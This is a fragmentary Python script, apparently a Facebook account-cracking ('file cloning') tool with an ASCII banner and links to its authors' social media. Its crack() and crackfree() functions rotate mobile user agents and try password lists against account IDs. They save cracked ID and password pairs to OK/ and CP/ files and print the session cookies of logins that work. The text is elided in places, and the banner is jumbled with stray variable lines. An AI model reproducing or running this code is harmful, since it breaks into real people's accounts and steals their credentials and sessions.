...
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY Facebook Account ")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100050407188659')
#------------------[ KALEEM-FATMA ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; vivo 1908_19) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36 ",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; vivo 1908 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; vivo 1908 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/9.3.0.1",]
ua = ["Mozilla/5.0 (Linux; Android 6.0.1; SM-J510FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 6.0.1; SM-J510FN Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36",]
...
ua = ["Mozilla/5.0 (Linux; Android 10; Infinix X682B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 10; fr-fr; Infinix X682B Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; RMX2040 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36",]
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/RASHID.SIMDHI.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system("xdg-open https://www.facebook.com/Rashid.King.Ok.Bro")
#------------------[ LOGO-LAKNAT ]-----------------#
logo="""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\t[>_] CREATE BY - @KALEEM-FATMA                                                       
   = "[#000000]" # Hitam   oooo    oooo       .o.       ooooo        oooooooooooo oooooooooooo ooo        ooooo                                
H2 = "[#00FF00]" # HijauM2 = "[#FF0000]" # Merah`888   .8P'       .888.      `888'        `888'     `8 `888'     `8 `88.       .888'                                
H2 = "[#00FF00]" # Hijau 888  d8'        .8"888.      888          888          888          888b     d'888                                 
 M2 = "[#FF0000]" # Merah88888[         .8' `888.     888          888oooo8     888oooo8     8 Y88. .P  888                                 
P2 = "[#FFFFFF]" # Putih 888`88b.      .88ooo8888.    888          888    "     888    "     8  `888'   888                                 
A2 = "[#AAAAAA]" # Abu-Abu 888  `88b.   .8'     `888.   888       o  888       o  888       o  8    Y     888                                 
P2 = "[#FFFFFF]" # Putiho888o  o888o o88o     o8888o o888ooooood8 o888ooooood8 o888ooooood8 o8o        o888o                                
                                                                                                                    
                                                                                                                    
                                                                                                                    
A2 = "[#AAAAAA]" # Abu-Abuoooo    oooo       .o.       ooooo              .o.            oooo    oooo ooooo   ooooo oooooooooooo ooooo        
P2 = "[#FFFFFF]" # Putih`888   .8P'       .888.      `888'             .888.           `888   .8P'  `888'   `888' `888'     `8 `888'        
M2 = "[#FF0000]" # Merah 888  d8'        .8"888.      888             .8"888.           888  d8'     888     888   888          888         
H2 = "[#00FF00]" # Hijau 88888[         .8' `888.     888            .8' `888.          88888[       888ooooo888   888oooo8     888         
P2 = "[#FFFFFF]" # Putih 888`88b.      .88ooo8888.    888           .88ooo8888.         888`88b.     888     888   888    "     888         
 A2 = "[#AAAAAA]" # Abu-Abu888  `88b.   .8'     `888.   888       o  .8'     `888.        888  `88b.   888     888   888       o  888       o 
M2 = "[#FF0000]" # Meraho888o  o888o o88o     o8888o o888ooooood8 o88o     o8888o      o888o  o888o o888o   o888o o888ooooood8 o888ooooood8
                                                                                                                                                                                                                                                                                                                                                                                                                                                            
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CEO KALEEM-FATMA 71  FIRE (⚡)
\033[0;92m • FILE CLONING ACTIVE FIRE (🔥)
\033[0;92m • VERSION [ 6.4 ] PAID (😻)
  \033[0;92m═════════════════════════════════════════════ \x1b[1;91m"""
os.system('clear')
print(logo)
#os.system('espeak -a 300 " Your,   Real,  Name,"')
#uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
#os.system('espeak -a 300 " Welcome,   to,  KALEEM,  ULLAH,  Tools"')
pass
 ...
 #   print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
  #  print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
    ...
    if Nasir in ['111']:
        ...
        os.system('xdg-open https://wa.me/+923206691045')
        os.system("python hacked.py")
    elif Nasir in ['3','03']:
        result()
    elif Nasir in ['0']:
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/Nasir.King.Ok.Bro")
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[KALEEMFATMA.•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[RASHID-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[RASHID-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " RASHID,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[KALEEMFATMA-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•KALEEM-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•KALEEM-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  RASHID,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
